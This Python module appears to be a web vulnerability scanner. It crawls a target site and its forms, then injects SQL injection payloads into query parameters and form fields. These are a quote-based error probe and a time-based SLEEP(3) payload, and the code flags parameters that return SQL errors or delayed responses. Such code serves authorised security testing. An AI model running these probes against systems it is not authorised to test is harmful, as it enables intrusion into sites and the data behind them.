from __future__ import annotations

import json
from time import perf_counter
import sys
from urllib.parse import urlparse

import httpx

from app.adapters.tools.web_common import (
    extract_forms,
    extract_links,
    extract_query_candidates,
    prioritize_links,
    snapshot_response,
)
from app.core.targeting import parse_target

HTTP_TIMEOUT_SECONDS = 5.0
MAX_LINKS = 8
MAX_CANDIDATES = 8
DYNAMIC_KEYWORDS = (
    "login",
    "admin",
    "api",
    "search",
    "query",
    "view",
    "detail",
    "item",
    "page",
    "doctor",
    "patient",
    "appointment",
)
FORM_FIELD_MARKERS = ("id", "user", "name", "email", "search", "query", "doctor", "patient", "dept", "title")
SQL_ERROR_MARKERS = (
    "sql syntax",
    "mysql_fetch",
    "mysqli_fetch",
    "sqlite error",
    "warning: mysql",
    "warning: mysqli",
    "odbc sql server driver",
    "postgresql",
    "syntax error",
    "unclosed quotation mark",
    "supplied argument is not a valid mysql",
)
ERROR_PAYLOAD = "'\"`"
TIME_PAYLOAD = "' AND SLEEP(3)-- "
TIME_THRESHOLD_SECONDS = 2.3


def _candidate_form_fields(fields: list[dict[str, str]]) -> list[str]:
    names: list[str] = []
    for field in fields:
        field_name = field.get("name", "")
        field_type = field.get("type", "text").lower()
        lowered = field_name.lower()
        if field_type in {"hidden", "submit", "button", "checkbox", "radio", "password"}:
            continue
        if field_type in {"text", "search", "email", "number", "tel", "url"} or any(
            marker in lowered for marker in FORM_FIELD_MARKERS
        ):
            if field_name not in names:
                names.append(field_name)
    return names[:3]


def _build_form_data(form: dict[str, object], *, mutate_field: str | None = None, payload: str = "") -> dict[str, str]:
    data: dict[str, str] = {}
    field_names = [field.get("name", "") for field in form.get("fields", []) if field.get("name")]
    for field_name in field_names:
        lowered = field_name.lower()
        if mutate_field == field_name:
            data[field_name] = payload
        elif "email" in lowered:
            data[field_name] = "codex@example.com"
        elif "id" in lowered or "dept" in lowered:
            data[field_name] = "1"
        elif "date" in lowered:
            data[field_name] = "2026-01-01"
        else:
            data[field_name] = "codex"
    data.setdefault("submit", "Submit")
    return data


def _timed_request(
    client: httpx.Client,
    method: str,
    url: str,
    *,
    params: dict[str, str] | None = None,
    data: dict[str, str] | None = None,
) -> tuple[httpx.Response, float]:
    started = perf_counter()
    response = client.request(method, url, params=params, data=data)
    return response, perf_counter() - started


def _new_sql_error(baseline_blob: str, candidate_blob: str) -> str | None:
    for marker in SQL_ERROR_MARKERS:
        if marker in candidate_blob and marker not in baseline_blob:
            return marker
    return None


def _discover_forms(client: httpx.Client, base_url: str) -> tuple[list[str], list[dict[str, object]]]:
    root_response = client.get(base_url)
    root_links = extract_links(base_url, root_response.text)
    candidate_links = prioritize_links(
        base_url,
        root_links,
        keywords=DYNAMIC_KEYWORDS,
        max_links=MAX_LINKS,
    )
    forms: list[dict[str, object]] = []
    for link in candidate_links:
        response = client.get(link)
        for form in extract_forms(str(response.request.url), response.text, max_forms=4):
            candidate_fields = _candidate_form_fields(form.get("fields", []))
            if not candidate_fields:
                continue
            forms.append(
                {
                    "page_url": form["page_url"],
                    "action": form["action"],
                    "method": "POST" if form["method"] == "GET" else form["method"],
                    "fields": candidate_fields,
                    "all_fields": form.get("fields", []),
                }
            )
    return candidate_links, forms[:MAX_CANDIDATES]


def main(argv: list[str]) -> int:
    if len(argv) < 2:
        print(json.dumps({"error": "target argument is required"}))
        return 1

    target = argv[1]
    profile = parse_target(target)
    base_url = profile.base_url

    payload: dict[str, object] = {
        "base_url": base_url,
        "links": [],
        "query_candidates": [],
        "form_candidates": [],
        "confirmed": [],
    }

    try:
        with httpx.Client(
            timeout=HTTP_TIMEOUT_SECONDS,
            follow_redirects=True,
            verify=False,
            trust_env=False,
        ) as client:
            root_response = client.get(base_url)
            payload["root"] = {
                "url": str(root_response.request.url),
                "status_code": root_response.status_code,
                "server": root_response.headers.get("server"),
            }

            query_candidates = extract_query_candidates(base_url, root_response.text)[:MAX_CANDIDATES]
            candidate_links, form_candidates = _discover_forms(client, base_url)
            payload["links"] = [urlparse(link).path or "/" for link in candidate_links]
            payload["query_candidates"] = query_candidates
            payload["form_candidates"] = [
                {
                    "page_url": form["page_url"],
                    "action": form["action"],
                    "method": form["method"],
                    "fields": form["fields"],
                }
                for form in form_candidates
            ]

            confirmed: list[dict[str, object]] = []

            for candidate in query_candidates[:MAX_CANDIDATES]:
                baseline_response, baseline_elapsed = _timed_request(client, "GET", candidate["url"])
                error_response, _ = _timed_request(
                    client,
                    "GET",
                    candidate["url"],
                    params={candidate["parameter"]: ERROR_PAYLOAD},
                )
                baseline_snapshot = snapshot_response(baseline_response)
                error_snapshot = snapshot_response(error_response)
                marker = _new_sql_error(baseline_snapshot.blob, error_snapshot.blob)
                if marker:
                    confirmed.append(
                        {
                            "kind": "error-based",
                            "mode": "query",
                            "path": candidate["path"],
                            "parameter": candidate["parameter"],
                            "signal": marker,
                            "status_code": error_response.status_code,
                        }
                    )
                    continue

                time_response, time_elapsed = _timed_request(
                    client,
                    "GET",
                    candidate["url"],
                    params={candidate["parameter"]: TIME_PAYLOAD},
                )
                if time_elapsed - baseline_elapsed >= TIME_THRESHOLD_SECONDS:
                    confirmed.append(
                        {
                            "kind": "time-based",
                            "mode": "query",
                            "path": candidate["path"],
                            "parameter": candidate["parameter"],
                            "signal": f"delay={time_elapsed:.2f}s baseline={baseline_elapsed:.2f}s",
                            "status_code": time_response.status_code,
                        }
                    )

            for form in form_candidates[:MAX_CANDIDATES]:
                for field in form["fields"][:2]:
                    baseline_response, baseline_elapsed = _timed_request(
                        client,
                        str(form["method"]),
                        str(form["action"]),
                        data=_build_form_data(form, mutate_field=None),
                    )
                    error_response, _ = _timed_request(
                        client,
                        str(form["method"]),
                        str(form["action"]),
                        data=_build_form_data(form, mutate_field=field, payload=ERROR_PAYLOAD),
                    )
                    baseline_snapshot = snapshot_response(baseline_response)
                    error_snapshot = snapshot_response(error_response)
                    marker = _new_sql_error(baseline_snapshot.blob, error_snapshot.blob)
                    if marker:
                        confirmed.append(
                            {
                                "kind": "error-based",
                                "mode": "form",
                                "path": urlparse(str(form["action"])).path or "/",
                                "parameter": field,
                                "signal": marker,
                                "status_code": error_response.status_code,
                            }
                        )
                        continue

                    time_response, time_elapsed = _timed_request(
                        client,
                        str(form["method"]),
                        str(form["action"]),
                        data=_build_form_data(form, mutate_field=field, payload=TIME_PAYLOAD),
                    )
                    if time_elapsed - baseline_elapsed >= TIME_THRESHOLD_SECONDS:
                        confirmed.append(
                            {
                                "kind": "time-based",
                                "mode": "form",
                                "path": urlparse(str(form["action"])).path or "/",
                                "parameter": field,
                                "signal": f"delay={time_elapsed:.2f}s baseline={baseline_elapsed:.2f}s",
                                "status_code": time_response.status_code,
                            }
                        )

            payload["confirmed"] = confirmed
    except Exception as exc:
        payload["error"] = str(exc)
        print(json.dumps(payload, ensure_ascii=False))
        return 1

    print(json.dumps(payload, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
